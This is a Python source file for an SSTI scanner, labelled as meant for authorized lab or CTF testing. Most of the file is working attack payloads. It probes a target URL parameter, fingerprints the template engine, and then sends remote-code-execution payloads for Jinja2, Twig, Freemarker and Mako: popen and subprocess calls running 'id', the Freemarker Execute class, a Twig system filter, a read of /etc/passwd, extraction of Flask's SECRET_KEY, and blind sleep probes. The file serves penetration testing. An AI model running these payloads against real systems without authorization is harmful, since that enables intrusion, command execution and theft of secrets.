#!/usr/bin/env python3
# For authorized testing in lab/CTF environments only
"""Server-Side Template Injection (SSTI) detection agent using requests.

Context-aware validation: detection compares against a baseline response and uses
word-boundary matching instead of raw substring checks, and RCE confirmation
requires concrete command-output markers rather than response length heuristics.
"""
import argparse
import json
import logging
import re
import sys
import time
import urllib.parse
from typing import List, Optional

try:
    import requests
except ImportError:
    sys.exit("requests is required: pip install requests")

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

DETECTION_PAYLOADS = {
    "jinja2_twig": {"payload": "{{7*7}}", "expected": "49"},
    "freemarker": {"payload": "${7*7}", "expected": "49"},
    "mako": {"payload": "${7*7}", "expected": "49"},
    "thymeleaf": {"payload": "#{7*7}", "expected": "49"},
    "erb_ejs": {"payload": "<%= 7*7 %>", "expected": "49"},
    "smarty": {"payload": "{7*7}", "expected": "49"},
    "velocity": {"payload": "#set($x=7*7)$x", "expected": "49"},
    "dotjs": {"payload": "{{= 7*7}}", "expected": "49"},
}

ENGINE_FINGERPRINTS = {
    "jinja2": {"payload": "{{7*'7'}}", "expected": "7777777"},
    "twig": {"payload": "{{7*'7'}}", "expected": "49"},
    "freemarker_confirm": {"payload": "${.now}", "match_pattern": r"\d{4}"},
    "flask_config": {"payload": "{{config}}", "match_pattern": r"SECRET_KEY|DEBUG"},
    "mako_confirm": {"payload": "${self.attr}", "match_pattern": r"Template|Module"},
}

# Time-based (blind) SSTI probes: payload -> minimum delay seconds expected.
BLIND_TIME_PAYLOADS = {
    "jinja2_sleep": {"payload": "{{''.__class__.__mro__[1].__subclasses__()[0].__init__.__globals__['time'].sleep(5)}}",
                     "delay": 5},
    "twig_sleep": {"payload": "{{['5']|map('system', 'sleep 5')|join}}", "delay": 5},
    "freemarker_sleep": {"payload": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"sleep 5\")}",
                        "delay": 5},
}

UID_RE = re.compile(r"uid=\d+")


def _send_payload(url: str, param: str, payload: str, method: str = "GET",
                   headers: Optional[dict] = None) -> requests.Response:
    h = headers or {}
    encoded = urllib.parse.quote(payload)
    try:
        if method.upper() == "GET":
            sep = "&" if "?" in url else "?"
            return requests.get(f"{url}{sep}{param}={encoded}", headers=h,
                                timeout=15, verify=False)
        else:
            return requests.post(url, data={param: payload}, headers=h,
                                  timeout=15, verify=False)
    except requests.RequestException:
        return type("R", (), {"status_code": 0, "text": "", "content": b"",
                              "elapsed": 0.0})()


def _baseline_text(url: str, param: str, method: str = "GET",
                   headers: Optional[dict] = None) -> str:
    """Send a benign, non-evaluating value to capture the baseline response."""
    resp = _send_payload(url, param, "ssti_baseline_probe_12345", method, headers)
    return resp.text or ""


def _count_word(text: str, word: str) -> int:
    return len(re.findall(r"\b" + re.escape(word) + r"\b", text))


def test_ssti_detection(url: str, param: str, method: str = "GET",
                         headers: Optional[dict] = None) -> List[dict]:
    """Test all detection payloads against a parameter (context-aware)."""
    results = []
    baseline = _baseline_text(url, param, method, headers)
    for engine, test in DETECTION_PAYLOADS.items():
        payload = test["payload"]
        expected = test["expected"]
        resp = _send_payload(url, param, payload, method, headers)
        # Context-aware: expected must appear more often than in baseline.
        found = _count_word(resp.text or "", expected) > _count_word(baseline, expected)
        results.append({
            "engine_hint": engine,
            "payload": payload,
            "expected": expected,
            "found_in_response": found,
            "status_code": resp.status_code,
            "baseline_matched": _count_word(baseline, expected) > 0,
        })
        if found:
            logger.warning("SSTI detected with %s payload: %s", engine, payload)
    return results


def identify_engine(url: str, param: str, method: str = "GET",
                     headers: Optional[dict] = None) -> dict:
    """Identify the specific template engine in use."""
    import re as _re

    baseline = _baseline_text(url, param, method, headers)

    resp_jinja = _send_payload(url, param, "{{7*'7'}}", method, headers)
    text = resp_jinja.text or ""
    if "7777777" in text and "7777777" not in baseline:
        return {"engine": "Jinja2", "language": "Python", "framework": "Flask/Django"}
    if _count_word(text, "49") > _count_word(baseline, "49"):
        # Could be Twig; confirm with config probe
        resp_config = _send_payload(url, param, "{{config}}", method, headers)
        if "SECRET_KEY" in (resp_config.text or ""):
            return {"engine": "Jinja2", "language": "Python", "framework": "Flask"}
        return {"engine": "Twig", "language": "PHP", "framework": "Symfony/Laravel"}

    resp_fm = _send_payload(url, param, "${.now}", method, headers)
    if _re.search(r"\d{4}", resp_fm.text or "") and not _re.search(r"\d{4}", baseline):
        return {"engine": "Freemarker", "language": "Java", "framework": "Spring"}

    resp_config = _send_payload(url, param, "{{config}}", method, headers)
    if "SECRET_KEY" in (resp_config.text or "") and "SECRET_KEY" not in baseline:
        return {"engine": "Jinja2", "language": "Python", "framework": "Flask"}

    resp_velocity = _send_payload(url, param, "#set($x=42)$x", method, headers)
    if "42" in (resp_velocity.text or "") and "42" not in baseline:
        return {"engine": "Velocity", "language": "Java", "framework": "Apache Velocity"}

    resp_mako = _send_payload(url, param, "${7*7}", method, headers)
    if _count_word(resp_mako.text or "", "49") > _count_word(baseline, "49"):
        # Mako uses ${}; distinguish from Freemarker by absence of .now
        return {"engine": "Mako", "language": "Python", "framework": "Mako/Pylons"}

    return {"engine": "unknown"}


def test_jinja2_rce(url: str, param: str, method: str = "GET",
                     headers: Optional[dict] = None) -> List[dict]:
    """Test Jinja2 RCE payloads (context-aware confirmation)."""
    payloads = [
        {"name": "cycler_popen", "payload": "{{cycler.__init__.__globals__.os.popen('id').read()}}"},
        {"name": "lipsum_popen", "payload": '{{lipsum.__globals__["os"].popen("id").read()}}'},
        {"name": "config_items", "payload": "{{config.items()}}"},
        {"name": "secret_key", "payload": "{{config.SECRET_KEY}}"},
    ]
    results = []
    baseline = _baseline_text(url, param, method, headers)
    for p in payloads:
        resp = _send_payload(url, param, p["payload"], method, headers)
        text = resp.text or ""
        rce_confirmed = bool(UID_RE.search(text)) and not bool(UID_RE.search(baseline))
        info_leak = ("SECRET_KEY" in text and "SECRET_KEY" not in baseline) or \
                    ("config" in text.lower() and "config" not in baseline.lower())
        results.append({
            "name": p["name"],
            "payload": p["payload"],
            "status_code": resp.status_code,
            "rce_confirmed": rce_confirmed,
            "info_leak": bool(info_leak),
            "response_preview": text[:200],
        })
    return results


def test_twig_rce(url: str, param: str, method: str = "GET",
                   headers: Optional[dict] = None) -> List[dict]:
    """Test Twig (PHP) RCE payloads."""
    payloads = [
        {"name": "filter_system", "payload": "{{['id']|filter('system')}}"},
        {"name": "file_excerpt", "payload": "{{'/etc/passwd'|file_excerpt(1,5)}}"},
    ]
    results = []
    baseline = _baseline_text(url, param, method, headers)
    for p in payloads:
        resp = _send_payload(url, param, p["payload"], method, headers)
        text = resp.text or ""
        rce_confirmed = (bool(UID_RE.search(text)) or "root:" in text) and \
                        not (bool(UID_RE.search(baseline)) or "root:" in baseline)
        results.append({
            "name": p["name"],
            "payload": p["payload"],
            "status_code": resp.status_code,
            "rce_confirmed": rce_confirmed,
            "response_preview": text[:200],
        })
    return results


def test_freemarker_rce(url: str, param: str, method: str = "GET",
                         headers: Optional[dict] = None) -> List[dict]:
    """Test Freemarker (Java) RCE payloads."""
    payloads = [
        {"name": "execute_class",
         "payload": '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'},
    ]
    results = []
    baseline = _baseline_text(url, param, method, headers)
    for p in payloads:
        resp = _send_payload(url, param, p["payload"], method, headers)
        text = resp.text or ""
        rce_confirmed = bool(UID_RE.search(text)) and not bool(UID_RE.search(baseline))
        results.append({
            "name": p["name"],
            "payload": p["payload"],
            "status_code": resp.status_code,
            "rce_confirmed": rce_confirmed,
            "response_preview": text[:200],
        })
    return results


def test_mako_rce(url: str, param: str, method: str = "GET",
                   headers: Optional[dict] = None) -> List[dict]:
    """Test Mako (Python) RCE payloads."""
    payloads = [
        {"name": "os_popen", "payload": "${__import__('os').popen('id').read()}"},
        {"name": "subprocess", "payload": "${__import__('subprocess').check_output('id', shell=True)}"},
    ]
    results = []
    baseline = _baseline_text(url, param, method, headers)
    for p in payloads:
        resp = _send_payload(url, param, p["payload"], method, headers)
        text = resp.text or ""
        rce_confirmed = bool(UID_RE.search(text)) and not bool(UID_RE.search(baseline))
        results.append({
            "name": p["name"],
            "payload": p["payload"],
            "status_code": resp.status_code,
            "rce_confirmed": rce_confirmed,
            "response_preview": text[:200],
        })
    return results


def test_blind_ssti(url: str, param: str, method: str = "GET",
                    headers: Optional[dict] = None) -> List[dict]:
    """Blind SSTI via time-based oracles (context-aware timing)."""
    results = []
    # Baseline timing
    t0 = time.time()
    _send_payload(url, param, "ssti_baseline_probe_12345", method, headers)
    baseline_elapsed = time.time() - t0

    for name, info in BLIND_TIME_PAYLOADS.items():
        payload = info["payload"]
        delay = info["delay"]
        t0 = time.time()
        resp = _send_payload(url, param, payload, method, headers)
        elapsed = time.time() - t0
        # Context-aware: must be significantly slower than baseline + delay
        blind = elapsed >= (baseline_elapsed + delay * 0.8)
        results.append({
            "name": name,
            "payload": payload,
            "status_code": getattr(resp, "status_code", 0),
            "baseline_elapsed": round(baseline_elapsed, 2),
            "elapsed": round(elapsed, 2),
            "blind_ssti_likely": blind,
        })
        if blind:
            logger.warning("Blind SSTI likely with %s (elapsed %.2fs)", name, elapsed)
    return results


def validate_rce_marker(url: str, param: str, method: str = "GET",
                        headers: Optional[dict] = None,
                        marker: str = "SSTI_SAFE_VALIDATION_MARKER") -> dict:
    """Safe RCE validation using a harmless echo marker (no destructive commands)."""
    payload = "{{cycler.__init__.__globals__.os.popen('echo " + marker + "').read()}}"
    baseline = _baseline_text(url, param, method, headers)
    resp = _send_payload(url, param, payload, method, headers)
    text = resp.text or ""
    confirmed = marker in text and marker not in baseline
    return {
        "marker": marker,
        "payload": payload,
        "status_code": resp.status_code,
        "rce_validated": confirmed,
        "response_preview": text[:200],
    }


def run_assessment(url: str, param: str, method: str = "GET") -> dict:
    """Run complete SSTI assessment."""
    detection = test_ssti_detection(url, param, method)
    vulnerable = any(d["found_in_response"] for d in detection)

    result = {
        "target": url, "parameter": param, "vulnerable": vulnerable,
        "detection_results": detection,
    }
    if vulnerable:
        engine = identify_engine(url, param, method)
        result["engine"] = engine
        eng = engine.get("engine")
        if eng == "Jinja2":
            result["rce_tests"] = test_jinja2_rce(url, param, method)
        elif eng == "Twig":
            result["rce_tests"] = test_twig_rce(url, param, method)
        elif eng == "Freemarker":
            result["rce_tests"] = test_freemarker_rce(url, param, method)
        elif eng == "Mako":
            result["rce_tests"] = test_mako_rce(url, param, method)
        result["blind_tests"] = test_blind_ssti(url, param, method)
        result["safe_validation"] = validate_rce_marker(url, param, method)

    return result


def main():
    parser = argparse.ArgumentParser(description="SSTI Detection Agent")
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--param", required=True, help="Parameter to test")
    parser.add_argument("--method", default="GET", choices=["GET", "POST"])
    parser.add_argument("--output", default="ssti_report.json")
    args = parser.parse_args()

    report = run_assessment(args.url, args.param, args.method)
    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)
    logger.info("Report saved to %s", args.output)
    print(json.dumps(report, indent=2))


if __name__ == "__main__":
    main()
